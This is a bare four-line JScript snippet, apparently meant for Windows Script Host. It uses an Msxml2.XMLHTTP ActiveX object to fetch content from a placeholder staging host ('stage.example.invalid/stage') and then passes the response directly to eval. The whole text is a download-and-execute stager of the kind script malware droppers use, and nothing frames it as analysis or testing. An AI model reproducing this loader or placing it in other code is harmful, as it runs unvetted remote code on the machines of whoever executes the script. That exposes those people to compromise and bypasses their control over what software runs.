var xhr = new ActiveXObject("Msxml2.XMLHTTP");
xhr.open("GET", "https://stage.example.invalid/stage", false);
xhr.send();
eval(xhr.responseText);
